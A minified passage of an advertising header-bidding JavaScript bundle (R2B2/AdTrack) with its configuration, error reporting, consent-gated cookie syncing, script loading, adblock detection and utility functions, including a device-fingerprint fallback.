const trackedKeys = window.trackedKeys;
window.AdTrack = window.AdTrack || {};
AdTrack.cfg = {
  "auction": {
    "timeout": 4000
  },
  "hb": {
    "timeout": 1000,
    "refreshEnabled": true,
    "domain": "ii.finance.cz"
  },
  "events": {
    "enabled": true,
    "flushTime": 1000,
    "flushInterval": 2000
  },
  "keywords": {
    "url": "https:\/\/kw.r2b2.cz\/keywords"
  },
  "accounts": {
    "appnexus": 8413,
    "pubmatic": 158361,
    "mgid": 225,
    "xandr": 11327,
    "rubicon": 21794,
    "criteo": 8799,
    "adsense": "ca-pub-4569624645600360",
    "onetag": "589715a03c07472",
    "adagio": 1089,
    "seedtag": "7733-4053-01",
    "vidoomy": 62152,
    "taboola": "0882bbd77745a4c78e3cd86a835b2c1ea974a13a",
    "wpartner": 441,
    "rtb-house": "ld4gYgkks5k893TY8lGe",
    "projectagora": 108971,
    "eplanning": "76d41"
  },
  "userId": {
    "enable": true,
    "loadLib": true,
    "forceRun": false,
    "cookie": "r2b2-pwt-cache",
    "pwt": "IHPWT",
    "storage": "r2b2-pwt-cache",
    "storageExpiration": "r2b2-pwt-cache-exp"
  },
  "errorReporting": {
    "enabled": true
  },
  "appVersion": "6.79.1",
  "cmp": {
    "required": 1
  },
  "override": true,
  "server": {
    "url": "delivery.r2b2.cz"
  }
}; /*! For license information please see bundle-hb.ec3313b35d86a6f5b738.js.LICENSE */
!function (t) {
  var e = {};
  function i(r) {
    if (e[r]) return e[r].exports;
    var n = e[r] = {
      i: r,
      l: !1,
      exports: {}
    };
    return t[r].call(n.exports, n, n.exports, i), n.l = !0, n.exports;
  }
  i.m = t, i.c = e, i.d = function (t, e, r) {
    i.o(t, e) || Object.defineProperty(t, e, {
      enumerable: !0,
      get: r
    });
  }, i.r = function (t) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, i.t = function (t, e) {
    if (1 & e && (t = i(t)), 8 & e) return t;
    if (4 & e && "object" == typeof t && t && t.__esModule) return t;
    var r = Object.create(null);
    if (i.r(r), Object.defineProperty(r, "default", {
      enumerable: !0,
      value: t
    }), 2 & e && "string" != typeof t) for (var n in t) i.d(r, n, function (e) {
      return t[e];
    }.bind(null, n));
    return r;
  }, i.n = function (t) {
    var e = t && t.__esModule ? function () {
      return t.default;
    } : function () {
      return t;
    };
    return i.d(e, "a", e), e;
  }, i.o = function (t, e) {
    return Object.prototype.hasOwnProperty.call(t, e);
  }, i.p = "", i(i.s = 170);
}([function (t, e, i) {
  "use strict";

  i.d(e, "a", function () {
    return r;
  });
  const r = {
    EVENTS: {
      ON_BID_REQUEST: "onBidRequestEvent",
      ON_FILTERED_REQUEST: "onFilteredRequestEvent",
      ON_BID_RESPONSE: "onBidResponseEvent",
      ON_BID_CONSENT: "onBidConsentRequestEvent",
      ON_PASSBACK: "onPassbackEvent",
      ON_BIDDER_ERROR: "onBidderErrorEvent",
      ON_BIDDER_TIMEOUT: "onBidderTimeoutEvent",
      ON_PBJ_ADUNITS: "onPbjAdUnits",
      ON_PBJ_BID_REQUESTED: "onPbjBidRequested",
      ON_PBJ_BID_REQUESTED_DEBUG: "onPbjBidRequestedDebug",
      ON_PBJ_BID: "onPbjBidR",
      ON_PBJ_WIN: "onPbjWin",
      ON_PBJ_LOAD: "onPbjLoad",
      ON_PBJ_IN_AUCTION: "onPbjInAuction",
      ON_PBJ_BID_TIMOUT: "onPbjBidTimeout",
      ON_PBJ_BID_TIMOUT_DEBUG: "onPbjBidTimeoutDebug",
      ON_PBJ_NO_BID: "onPbjNoBid",
      ON_PBJ_BID_DONE: "onPbjBidDone",
      ON_PBJ_CALL: "onPbjCall",
      ON_PLACEMENT_AD_START: "onPlAdStart",
      ON_PLACEMENT_AD_REQUEST: "onPlAdRequest",
      ON_PLACEMENT_PASSBACK: "onPlPassback",
      PROFILING: "onProfiling"
    },
    MEDIA_TYPE: {
      NATIVE: "mtNative",
      BANNER: "mtBanner",
      VIDEO: "mtVideo"
    },
    ERROR: {
      SEVERITY: {
        LOW: "low",
        HIGH: "high",
        CRITICAL: "critical",
        DEBUG: "debug"
      },
      TYPE: {
        GENERAL: "general",
        RUNTIME: "runtime",
        DEFINITION: "definition",
        UNEXPECTED_STATE: "unexpected",
        ADAPTER: "adapter",
        PUBLISHER_SETTINGS: "publisher"
      },
      SOURCE: {
        PREBID: "prebid",
        DISPATCHER: "dispatcher"
      }
    }
  };
}, function (t, e, i) {
  "use strict";

  var r = i(0);
  function n(t, e, i) {
    var n = "//" + t + "/error?" + AdTrack.Utils.uri("m", i.getMessage()) + "&" + AdTrack.Utils.uri("s", i.getSeverity()) + "&" + AdTrack.Utils.uri("u", AdTrack.url) + (i.getSource() === r.a.ERROR.SOURCE.PREBID ? "&" + AdTrack.Utils.uri("p", 1) : "");
    e && "string" == typeof e && (n += "&" + AdTrack.Utils.uri("d", e));
    let s = i.getPlacementId();
    s && "function" == typeof s.getNameForReporting && (n += "&" + AdTrack.Utils.uri("pl", s.getNameForReporting()));
    let a = function (t) {
      if ("[object Object]" !== Object.prototype.toString.call(t)) return null;
      try {
        return JSON.stringify(t);
      } catch (t) {
        return null;
      }
    }(i.getParams());
    a && (n += "&" + AdTrack.Utils.uri("pr", a)), AdTrack.Utils.jsonp(n, "callback", function (t) {});
  }
  function s(t) {
    return t ? r.a.ERROR.SOURCE.PREBID : r.a.ERROR.SOURCE.DISPATCHER;
  }
  function a(t, e, i, a) {
    let o = s(i);
    return {
      getSource: () => o,
      error: (i, s, d, c) => {
        n(t, e, function (t, e, i, n, s, a) {
          return i = i || r.a.ERROR.SEVERITY.LOW, e = e || r.a.ERROR.TYPE.GENERAL, s = s || r.a.ERROR.SOURCE.DISPATCHER, t = "[V-" + AdTrack.Config.getAppVersion() + "] " + t, {
            getMessage: () => t,
            getType: () => e,
            getSeverity: () => i,
            getParams: () => n,
            getSource: () => s,
            getPlacementId: () => a
          };
        }(i, s, d, c, o, a));
      }
    };
  }
  const o = function () {
    let t = {},
      e = {};
    return {
      getErrorReporting: (e, i, r) => {
        let n = s(r);
        return t[n] || (t[n] = a(e, i, r)), t[n];
      },
      getPlacementErrorReporting: (t, i, r, n) => {
        let o = s(r),
          d = n.getName();
        return e[o] || (e[o] = {}), e[o][d] || (e[o][d] = a(t, i, r, n)), e[o][d];
      }
    };
  }();
  function d(t, e) {
    const i = AdTrack.Config.getReportingUrl(),
      r = AdTrack.Config.getHBDomain();
    return e ? o.getPlacementErrorReporting(i, r, !!t, e) : o.getErrorReporting(i, r, !!t);
  }
  function c(t, e, i, r, n, s) {
    d(t, s).error(e, i, r, n);
  }
  function h(t, e, i, r, n) {
    c(!0, t, e, i, r, n);
  }
  function l(t, e, i) {
    u(t, e, !0, i);
  }
  function u(t, e, i, n) {
    let s = d(i, n);
    if (e.adtrack) {
      let t = e.adtrack;
      s.error(t.message, t.type, t.severity, t.params);
    } else s.error(t + " - " + e.message, r.a.ERROR.TYPE.RUNTIME);
  }
  i.d(e, "a", function () {
    return c;
  }), i.d(e, "b", function () {
    return h;
  }), i.d(e, "d", function () {
    return l;
  }), i.d(e, "c", function () {
    return u;
  });
}, function (t, e, i) {
  "use strict";

  i.d(e, "a", function () {
    return r;
  }), i.d(e, "b", function () {
    return n;
  }), window.R2B2 = window.R2B2 || {};
  const r = window.R2B2,
    n = "R2B2";
}, function (t, e, i) {
  "use strict";

  i.d(e, "m", function () {
    return r;
  }), i.d(e, "o", function () {
    return n;
  }), i.d(e, "b", function () {
    return s;
  }), i.d(e, "a", function () {
    return a;
  }), i.d(e, "i", function () {
    return o;
  }), i.d(e, "e", function () {
    return d;
  }), i.d(e, "l", function () {
    return c;
  }), i.d(e, "h", function () {
    return h;
  }), i.d(e, "g", function () {
    return l;
  }), i.d(e, "j", function () {
    return u;
  }), i.d(e, "c", function () {
    return p;
  }), i.d(e, "d", function () {
    return f;
  }), i.d(e, "n", function () {
    return g;
  }), i.d(e, "k", function () {
    return m;
  }), i.d(e, "f", function () {
    return k;
  }), i.d(e, "p", function () {
    return b;
  });
  i(0);
  function r(t, e) {
    AdTrack.Log && (e || (e = AdTrack.Log.INFO), AdTrack.Log.debug("AdTrack.HB", t, e, !0));
  }
  function n(t, e) {}
  function s(t, e, i, r) {}
  function a(t) {
    if (!t) return "";
    let e = '<div style="position:absolute;left:0px;top:0px;visibility:hidden;">';
    return e += '<img src="' + encodeURI(t) + '"></div>';
  }
  function o() {
    return [window.screen.width, window.screen.height].join("x");
  }
  function d(t, e) {
    var i = null;
    return e.forEach(function (e) {
      ["adId", "bidId", "requestId"].forEach(function (r) {
        e[r] && e[r] === t && (i = e);
      });
    }), i;
  }
  function c(t) {
    return "function" == typeof t;
  }
  function h() {
    let t = AdTrack.Config.getPrebidObjectName();
    window[t] = window[t] || {};
    let e = window[t];
    return e.que = e.que || [], e;
  }
  function l(t) {
    try {
      return localStorage.getItem(t);
    } catch (t) {
      return null;
    }
  }
  function u(t) {
    if (t) {
      let e = document.createElement("a");
      return e.href = t, e.hostname;
    }
  }
  function p(t, e) {
    if (t) {
      e = String(e).split(".");
      for (let i = 0; i < e.length; i++) if (void 0 === (t = t[e[i]])) return;
      return t;
    }
  }
  function f(t, e, i) {
    if (t) {
      e.split && (e = e.split("."));
      for (var r, n = 0, s = e.length, a = t; n < s; ++n) r = a[e[n]], a = a[e[n]] = n === s - 1 ? i : null != r ? r : !~e[n + 1].indexOf(".") && +e[n + 1] > -1 ? [] : {};
    }
  }
  function g(t, e) {
    let i = {};
    return t && t.length && t.forEach(t => {
      const r = t && t.params && t.params.chd,
        n = r && r.accountId ? r.accountId : e;
      i[n] || (i[n] = []), i[n].push(t);
    }), i;
  }
  function m() {
    if (AdTrack.UserID && "function" == typeof AdTrack.UserID.getBinary) return AdTrack.UserID.getBinary();
  }
  function k(t) {
    let e, i, r;
    try {
      window.top.AdTrack = window.top.AdTrack || {}, window.top.AdTrack.req || (window.top.AdTrack.req = {}), i = 0, e = window.top.AdTrack.req;
    } catch (t) {
      AdTrack.req || (AdTrack.req = {}), i = 1, e = AdTrack.req;
    }
    return e[t] ? e[t]++ : e[t] = 1, {
      refresh: r = e[t] > 1 ? 1 : 0,
      iframe: i
    };
  }
  function b(t) {
    return !(!isNaN(t) && t >= 0 && t <= 1) || (e = 100 * t, !(!(e = parseInt(e, 10)) || isNaN(e) || e < 0 || e < 100 && !(100 * Math.random() < e)));
    var e;
  }
}, function (t, e, i) {
  "use strict";

  i.d(e, "a", function () {
    return r;
  }), i.d(e, "b", function () {
    return n;
  }), window.AdTrack = window.AdTrack || {};
  const r = window.AdTrack,
    n = "AdTrack";
}, function (t, e, i) {
  "use strict";

  i.d(e, "a", function () {
    return a;
  }), i.d(e, "c", function () {
    return h;
  }), i.d(e, "b", function () {
    return l;
  }), i.d(e, "d", function () {
    return u;
  });
  var r = i(4),
    n = i(2),
    s = i(3);
  const a = {
      RENDERER: "renderer",
      RENDER_MAP: "renderMap",
      PLACEMENT_REGISTRY: "placementRegistry",
      AUCTION_MANAGER: "auctionManager",
      EVENTS: "events",
      USER_SYNC: "userSync"
    },
    o = {};
  o[a.RENDERER] = n.b + ".HB.Renderer", o[a.RENDER_MAP] = n.b + ".HB.Render.renderMap", o[a.PLACEMENT_REGISTRY] = r.b + ".Prebid.placementRegistry", o[a.AUCTION_MANAGER] = r.b + ".Prebid.auctionManager", o[a.EVENTS] = r.b + ".Prebid.Events", o[a.USER_SYNC] = r.b + ".UserSync";
  const d = {};
  function c(t) {
    const e = o[t],
      i = d[t];
    if (e) {
      const t = Object(s.c)(window, e);
      if (t && (!i || i(t))) return t;
    }
    return null;
  }
  function h(t, e) {
    const i = o[t];
    !c(t) && i && Object(s.d)(window, i, e);
  }
  function l(t, e) {
    if ("function" != typeof e) throw new Error("Cant export global, initializer must be a function");
    const i = c(t);
    return i || e();
  }
  function u() {
    r.a.Prebid = r.a.Prebid || {}, n.a.HB = n.a.HB || {}, n.a.HB.Render = n.a.HB.Render || {}, n.a.HB.Render.queue = n.a.HB.Render.queue || [];
  }
  d[a.USER_SYNC] = function (t) {
    return "function" == typeof t.registerSync;
  };
}, function (t, e, i) {
  "use strict";

  i.d(e, "a", function () {
    return n;
  });
  var r = i(5);
  let n = Object(r.b)(r.a.USER_SYNC, function () {
    const t = "iframe",
      e = "image",
      i = "syncFunction";
    let r = {},
      n = {},
      s = {};
    function a(t) {
      r[t] || (r[t] = {});
    }
    function o(t, e, i) {
      a(t), r[t][e] || (r[t][e] = []), r[t][e].push(i);
    }
    function d(t, e) {
      a(t), r[t].blocked = !0, r[t].blocker_reason = e || "";
    }
    function c() {
      let o = Object.getOwnPropertyNames(r),
        c = [t, e, i],
        f = {};
      f[t] = l, f[e] = h, f[i] = u;
      let g = null;
      window.AdTrack && AdTrack.CMP && (g = AdTrack.CMP.getConsentData()), function () {
        if (!(window.AdTrack && AdTrack.Prebid && AdTrack.Prebid.placementRegistry)) return;
        let t = AdTrack.Prebid.placementRegistry.getPlacements();
        Object.keys(t).forEach(e => {
          if (t.hasOwnProperty(e)) {
            let i = t[e].getDefinition(),
              r = i.getOption("csyncWhiteList");
            r && "string" == typeof r && r.split(",").forEach(t => {
              n[t] = !0;
            });
            let a = i.getOption("csyncBlackList");
            a && "string" == typeof a && a.split(",").forEach(t => {
              s[t] = !0;
            });
          }
        });
      }(), o.forEach(t => {
        if (!function (t) {
          return r[t] && r[t].synced;
        }(t)) if (function (t) {
          a(t), r[t].synced = !0;
        }(t), Object.getOwnPropertyNames(s).length && s[t]) d(t, "black_listed");else if (!Object.getOwnPropertyNames(n).length || n[t]) {
          if (r[t].publisher && "mafra" === r[t].publisher || "xandr" === t) {
            let e = r[t].vendorId;
            if (!p(g, e)) return void d(t, "gdpr_vendor_not_allowed");
          }
          c.forEach(e => {
            r[t][e] && r[t][e].length && r[t][e].forEach(t => {
              try {
                f[e](t), t.status = "done";
              } catch (e) {
                t.status = "error", t.error = e.message;
              }
            });
          });
        } else d(t, "not_white_listed");
      });
    }
    function h(t) {
      AdTrack.Utils.firePixel(t.url);
    }
    function l(t) {
      AdTrack.Utils.csyncFrame(t.url);
    }
    function u(t) {
      t.fn();
    }
    const p = function (t, e) {
      if (t && e) {
        if (!t.gdprApplies) return !0;
        if (t.vendor && t.purpose) {
          let i = t.vendor.consents || {},
            r = (t.purpose.consents || {})[1];
          if (i[e] && r && t.consentString) return !0;
        }
      }
      return !1;
    };
    let f = {};
    return f.registerSync = (n, s, d, c) => {
      (function (t) {
        return r[t] && r[t].registered;
      })(n) || (!function (t, e, i) {
        a(t), r[t].registered = !0, r[t].vendorId = e, r[t].publisher = i;
      }(n, d, c), Array.isArray(s) || (s = [s]), s.forEach(r => {
        if (r.type) {
          let s = r.type;
          s !== t && s !== e || !r.url ? s === i && r.fn && "function" == typeof r.fn && o(n, i, {
            fn: r.fn
          }) : o(n, s, {
            url: r.url
          });
        }
      }));
    }, f.syncUsers = t => {
      t ? setTimeout(() => {
        c();
      }, t) : c();
    }, f.isUserSyncAllowed = p, f.isVendorAllowed = function (t) {
      if (AdTrack.CMP) {
        let e = AdTrack.CMP.getConsentData();
        return p(e, t);
      }
      return !1;
    }, f.addUserSync = function (t, e, r, n) {
      let s = t,
        a = void 0;
      n && n.publisher && n.publisher.tag && (a = n.publisher.tag);
      let o = [{
        fn: r,
        type: i
      }];
      f.registerSync(s, o, e, a);
    }, f;
  });
}, function (module, exports) {
  var toString, isArray, escMap, escFunc, escRE, _units, libs, _runCallbackQueue, _Lib;
  if (Function.prototype.bind || (Function.prototype.bind = function (t) {
    if ("function" != typeof this) throw new TypeError("Function.prototype.bind - what is trying to be bound is not callable");
    var e = Array.prototype.slice.call(arguments, 1),
      i = this,
      r = function () {},
      n = function () {
        return i.apply(this instanceof r && t ? this : t, e.concat(Array.prototype.slice.call(arguments)));
      };
    return r.prototype = this.prototype, n.prototype = new r(), n;
  }), Array.prototype.forEach || (Array.prototype.forEach = function (t, e) {
    for (var i = 0, r = this.length; i < r; i++) i in this && t.call(e, this[i], i, this);
  }), String.prototype.trim || (String.prototype.trim = function () {
    return this.replace(/^\s+|\s+$/g, "");
  }), Array.isArray || (Array.isArray = function (t) {
    return "" + t !== t && "[object Array]" == {}.toString.call(t);
  }), window.AdTrack || (window.AdTrack = {}), window.AdTrack.units || (window.AdTrack.units = {}), window.AdTrack.static || (AdTrack.static = {}), window.AdTrack.Report || (AdTrack.Report = {}), window.AdTrack.JSON || (window.AdTrack.JSON = {
    parse: function (sJSON) {
      return eval("(" + sJSON + ")");
    },
    stringify: (toString = Object.prototype.toString, isArray = Array.isArray || function (t) {
      return "[object Array]" === toString.call(t);
    }, escMap = {
      '"': '\\"',
      "\\": "\\\\",
      "\b": "\\b",
      "\f": "\\f",
      "\n": "\\n",
      "\r": "\\r",
      "\t": "\\t"
    }, escFunc = function (t) {
      return escMap[t] || "\\u" + (t.charCodeAt(0) + 65536).toString(16).substr(1);
    }, escRE = /[\\"\u0000-\u001F\u2028\u2029]/g, function t(e) {
      if (null == e) return "null";
      if ("number" == typeof e) return isFinite(e) ? e.toString() : "null";
      if ("boolean" == typeof e) return e.toString();
      if ("object" == typeof e) {
        if (isArray(e)) {
          for (var i = "[", r = 0; r < e.length; r++) i += (r ? ", " : "") + t(e[r]);
          return i + "]";
        }
        if ("function" == typeof e.toJSON) return t(e.toJSON());
        if ("[object Object]" === toString.call(e)) {
          var n = [];
          for (var s in e) e.hasOwnProperty(s) && n.push(t(s) + ": " + t(e[s]));
          return "{" + n.join(", ") + "}";
        }
      }
      return '"' + e.toString().replace(escRE, escFunc) + '"';
    })
  }), !window.AdTrack.url) try {
    window.AdTrack.url = window.top.location.href;
  } catch (t) {
    window.AdTrack.url = window.location.href;
  }
  AdTrack.startTime = AdTrack.startTime || new Date().getTime(), AdTrack.que = AdTrack.que || [], AdTrack.que.done || setTimeout(function () {
    var t = function (t) {
      "function" == typeof t && t();
    };
    AdTrack.que.forEach(t), AdTrack.que.push = t, AdTrack.que.done = !0;
  }, 1), AdTrack.placementQ = window.AdTrack.placementQ || (_units = {}, {
    push: function (t, e) {
      "function" == typeof e && t && (AdTrack.units[t] ? e() : (_units[t] = _units[t] || [], _units[t].push(e)));
    },
    execute: function (t) {
      for (var e = _units[t] || []; e.length;) e.shift()();
    }
  }), AdTrack.call = function (t, e) {
    var i = Array.prototype.slice.call(arguments, 2),
      r = function () {
        if ("function" == typeof AdTrack.units[t][e]) {
          var r = AdTrack.units[t];
          r[e].apply(r, i);
        }
      };
    AdTrack.placementQ.push(t, r);
  }, AdTrack.BrowserFlags = {
    isOldIE: -1 !== navigator.appVersion.indexOf("MSIE 10") || -1 !== navigator.appVersion.indexOf("MSIE 9") || -1 !== navigator.appVersion.indexOf("MSIE 8"),
    isIE8: -1 !== navigator.appVersion.indexOf("MSIE 8"),
    isIE: -1 !== navigator.userAgent.indexOf("MSIE"),
    isOldOpera: window.opera && opera.version() < 15,
    isFirefox: -1 !== navigator.userAgent.toLowerCase().indexOf("firefox"),
    isPhone: navigator.userAgent.match(/iPhone/i) || navigator.userAgent.match(/iPod/i),
    isOldAndroid: navigator.userAgent.indexOf("Android") >= 0 && parseFloat(navigator.userAgent.slice(navigator.userAgent.indexOf("Android") + 8)) <= 2.3
  }, AdTrack.Libs = AdTrack.Libs || (libs = {}, _runCallbackQueue = function (t) {
    for (; t.length > 0;) t.shift()();
    t.push = function (t) {
      t();
    };
  }, _Lib = function (t, e, i) {
    var r = [],
      n = [],
      s = !1,
      a = function () {
        s = !0, _runCallbackQueue(r);
      };
    if (i) {
      var o = "AdTrack" + Math.round(1e8 * Math.random());
      window[o] = a, document.write("<script src='" + e + "'><\/script>"), document.write("<script>window['" + o + "'](); <\/script>");
    } else {
      var d = document.createElement("script");
      d.src = e, d.onload = a, d.onerror = function () {
        _runCallbackQueue(n);
      }, document.querySelector("head").appendChild(d);
    }
    return {
      isLoaded: function () {
        return s;
      },
      onload: function (t) {
        "function" == typeof t && r.push(t);
      },
      onerror: function (t) {
        "function" == typeof t && n.push(t);
      }
    };
  }, {
    getLib: function (t) {
      if ("string" == typeof t) return libs[t];
    },
    isDeployed: function (t) {
      if ("string" == typeof t) return !!libs[t];
    },
    isAvailable: function (t) {
      return "string" == typeof t && libs[t] && libs[t].isLoaded();
    },
    deploy: function (t, e, i) {
      if ("string" == typeof t) return libs[t] ? libs[t] : (libs[t] = new _Lib(t, e, i), libs[t]);
    }
  }), void 0 === window.AdTrack.adblock && (window.AdTrack.adblock = !1, function () {
    try {
      t = "https://static.criteo.net/images/pixel.gif?ch=2", e = function () {}, i = function () {
        window.AdTrack.adblock = !0;
      }, (r = document.createElement("img")).src = t, r.height = 1, r.width = 1, r.style.display = "none", r.onload = e, r.onerror = i;
    } catch (t) {}
    var t, e, i, r;
  }());
}, function (t, e) {
  var i;
  (i = AdTrack.cfg) && "object" == typeof i || (i = {}), AdTrack.Config && !i.override || (AdTrack.Config = {
    getAuctionTimeout: function () {
      return (i.auction ? i.auction.timeout : null) || 5e3;
    },
    getServerURL: function () {
      return (i.server ? i.server.url : null) || "trackad.cz";
    },
    getHBDomain: function () {
      return (i.hb ? i.hb.domain : null) || "";
    },
    getHBTimeout: function () {
      return (i.hb ? i.hb.timeout : null) || 2e3;
    },
    getPrebidObjectName: function () {
      return (i.hb ? i.hb.pbjs : null) || "pbjs";
    },
    getReportingUrl: function () {
      return (i.reporting ? i.reporting.url : null) || "trackad.cz";
    },
    isCMPRequired: function () {
      return !!i.cmp && !!i.cmp.required;
    },
    isCMPEnabled: function () {
      return !!i.cmp && !!i.cmp.gdpr;
    },
    isHBRefreshEnabled: function () {
      return !i.hb || !!i.hb.refreshEnabled;
    },
    getCMPFallback: function () {
      return (i.cmp ? i.cmp.fallback : null) || "normal";
    },
    eventsEnabled: function () {
      return !i.events || !!i.events.enabled;
    },
    eventsFlushInterval: function () {
      return (i.events ? i.events.flushInterval : null) || 1e3;
    },
    getAccountId: function (t) {
      return (i.accounts ? i.accounts[t] : null) || "";
    },
    getKeywordsUrl: function () {
      return i.keywords ? i.keywords.url : null;
    },
    getAppVersion: function () {
      return i.appVersion ? i.appVersion : "0.0.1";
    },
    getUserID: function () {
      return i.userId ? i.userId : {};
    },
    isErrorReportingEnabled: function () {
      return !i.errorReporting || !!i.errorReporting.enabled;
    }
  }), AdTrack.cfg = void 0;
}, function (t, e) {
  var i, r, n, s, a, o;
  AdTrack.Utils = AdTrack.Utils || ((a = {}).uri = function (t, e) {
    return t + "=" + encodeURIComponent(e);
  }, a.time = function () {
    return new Date().getTime();
  }, a.timeToEndOfDay = function () {
    var t = new Date();
    return t.setHours(23, 59, 59, 999), t - new Date();
  }, a.timeRelative = function () {
    return Math.round(window.performance && window.performance.now ? window.performance.now() : new Date().getTime());
  }, a.getParameterByName = function (t) {
    try {
      var e = new RegExp("[\\?&]" + t + "=([^&#]*)").exec(window.location.search);
      return null === e ? "" : decodeURIComponent(e[1].replace(/\+/g, " "));
    } catch (t) {
      return "";
    }
  }, a.createEvent = function (t, e) {
    var i;
    try {
      i = new Event(e);
    } catch (r) {
      (i = t.createEvent("Event")).initEvent(e, !1, !1);
    }
    return i;
  }, a.addEvent = function (t, e, i) {
    null != t && void 0 !== t && (t.addEventListener ? t.addEventListener(e, i, !1) : t.attachEvent ? t.attachEvent("on" + e, i) : t["on" + e] = i);
  }, a.removeEvent = function (t, e, i) {
    null != t && void 0 !== t && (t.removeEventListener ? t.removeEventListener(e, i, !1) : t.detachEvent ? t.detachEvent("on" + e, i) : t["on" + e] = "");
  }, a.singleUseCallback = function (t) {
    var e = !1;
    return function () {
      e || (e = !0, t.apply(this, arguments));
    };
  }, a.jsonp = function (t, e, i, r) {
    var n = null,
      s = ("adTrackJSONP" + Math.random()).replace(".", "");
    if (t = t + "&" + AdTrack.Utils.uri(e, s)) {
      var o = function () {
          try {
            delete window[s];
          } catch (t) {}
          try {
            n && (n.parentNode.removeChild(n), n = null);
          } catch (t) {}
        },
        d = a.singleUseCallback(function (t, e) {
          i && i(t, e);
        });
      window[s] = function (t, e) {
        d(t, e), o();
      };
      var c = document.createElement("script");
      c.setAttribute("src", t), n = c, c.onerror = function () {
        d("request-error"), o();
      }, document.getElementsByTagName("head")[0].appendChild(c), r && r > 0 && setTimeout(function () {
        d("request-timeouted");
      }, r);
    }
  }, a.errorReporting = function (t, e, i, r) {
    return {
      doError: function (n, s, a, o) {
        if ("function" != typeof AdTrack.Config.isErrorReportingEnabled || AdTrack.Config.isErrorReportingEnabled()) {
          null != a && "undefined" != a || (a = "low"), n = "[V-" + AdTrack.Config.getAppVersion() + "] " + n, o && (o = JSON.stringify(o));
          var d = "//" + t + "/error?" + AdTrack.Utils.uri("m", n) + "&" + AdTrack.Utils.uri("s", a) + "&" + AdTrack.Utils.uri("u", e) + (i ? "&" + AdTrack.Utils.uri("p", 1) : "") + (o ? "&" + AdTrack.Utils.uri("pr", o) : "");
          (s = s || r) && "function" == typeof s.getNameForReporting && (d += "&" + AdTrack.Utils.uri("pl", s.getNameForReporting())), AdTrack.Utils.jsonp(d, "callback", function (t) {});
        }
      }
    };
  }, a.genericRequest = function (t) {
    return {
      doProfiling: function (e, i) {
        var r = {
            rt: 0,
            t: 0,
            e: "profiling",
            c: null,
            cf: null,
            v: i
          },
          n = {};
        n[e] || (n[e] = []), n[e].push(r);
        var s = new XMLHttpRequest();
        s.open("POST", t, !0), s.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        var a = AdTrack.JSON.stringify(n);
        a = a.replace(/&/g, "%26"), s.send("events=" + a);
      }
    };
  }, a.replaceMacros = function (t, e) {
    try {
      return t.replace(/%%([a-zA-Z][a-zA-Z\.]*)%%/g, function (t, i, r, n) {
        return a.deepAccess(e, i) || t;
      });
    } catch (e) {
      return t;
    }
  }, a.validateSelector = function (t, e) {
    return e && (t = a.replaceMacros(t, e)), t = (t = t.replace(/^([#.]?)([0-9])/, "$1\\3$2 ")).replace(/[\/.:;]/g, function (t, e, i) {
      return e > 0 && "\\" !== i.charAt(e - 1) ? "\\" + t : t;
    });
  }, a.appendCss = function (t, e, i, r) {
    var n = document.createElement("style");
    if (t) {
      r && (e = a.replaceMacros(e, r)), i ? i.addElement(t, n) : t.appendChild(n);
      try {
        n.innerHTML = e;
      } catch (t) {
        n.styleSheet.cssText = e;
      }
    }
    return n;
  }, a.cssPrefix = function (t, e) {
    var i = t + ": " + e + "; ";
    return ["moz", "o", "ms", "webkit"].forEach(function (r) {
      i += "-" + r + "-" + t + ": " + e + "; ";
    }), i;
  }, a.addClassName = function (t, e) {
    return t && (t.className += (t.className ? " " : "") + e), t;
  }, a.styleizeAll = function (t, e, i) {
    var r = t.createElement("style");
    i.addElement(t.getElementsByTagName("head")[0], r);
    var n = e.childNodes;
    n.length > 0 && (a.styleize(n, r), Array.prototype.forEach.call(n, function (t) {
      a.styleizeAll(t);
    }));
  }, a.styleize = function (t, e) {
    Array.prototype.forEach.call(t, function (t) {
      if ("function" == typeof t.hasAttribute && t.hasAttribute("style")) {
        var i = t.getAttribute("style");
        if (i) {
          var r = "d" + Math.round(1e7 * Math.random());
          a.cssToStyle(e, "." + r + "{" + i + "}"), a.addClassName(t, r);
        }
        t.removeAttribute("style");
      }
    });
  }, a.cssToStyle = function (t, e) {
    try {
      t.innerHTML += " " + e;
    } catch (i) {
      t.styleSheet.cssText += " " + e;
    }
  }, a.applyTransform = function (t, e, i) {
    t && (t.style.webkitTransform = e, t.style.MozTransform = e, t.style.msTransform = e, t.style.OTransform = e, t.style.transform = e, i && (t.style.webkitTransformOrigin = i, t.style.MozTransformOrigin = i, t.style.msTransformOrigin = i, t.style.OTransformOrigin = i, t.style.transformOrigin = i));
  }, a.b2a = function (t) {
    var e,
      i,
      r,
      n,
      s,
      a,
      o = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
      d = 0,
      c = 0,
      h = "",
      l = [];
    if (!t) return t;
    do {
      e = 63 & (s = t.charCodeAt(d++) << 16 | t.charCodeAt(d++) << 8 | t.charCodeAt(d++)) >> 18, i = 63 & s >> 12, r = 63 & s >> 6, n = 63 & s, l[c++] = o.charAt(e) + o.charAt(i) + o.charAt(r) + o.charAt(n);
    } while (d < t.length);
    return h = l.join(""), ((a = t.length % 3) ? h.slice(0, a - 3) : h) + "===".slice(a || 3);
  }, a.getDeviceId = function () {
    if (void 0 === i) if (AdTrack.Cookies.cookiesEnabled) {
      var t = AdTrack.Cookies.getCookie("hbttv-uuid");
      t || (t = a.uuid(), AdTrack.Cookies.setCookie("hbttv-uuid", t, 2678400)), i = t = "" !== t ? t : null;
    } else {
      var e = null;
      if (window.navigator && window.screen) {
        var r = window.navigator,
          n = window.screen;
        e = r.mimeTypes.length, e += r.userAgent.replace(/\D+/g, ""), e += r.plugins.length, e += n.height || "", e += n.width || "", e += n.pixelDepth || "";
      }
      i = AdTrack.Utils.b2a(e);
    }
    return i;
  }, a.getDGPMKey = function (t) {
    var e = {};
    t.params && !t.params.length && (e = t.params), t.params && 1 === t.params.length && (e = t.params[0]), t.ext && t.ext.dgpm && (e = t.ext.dgpm);
    var i = e.d || "",
      r = e.g || "",
      n = e.p || "",
      s = e.m ? "mobile" : "classic";
    if (i && r && n) return s + "_" + i + "_" + r + "_" + n;
  }, a.isBidOfPlacement = function (t, e, i, r, n) {
    return !(!t || "r2b2" !== t.bidder || !t.params) && t.params.d === e && t.params.g === i && t.params.p === r && t.params.m == n;
  }, a.isInPrebidAdUnit = function (t, e, i, r, n) {
    var s = !1,
      o = t.bids;
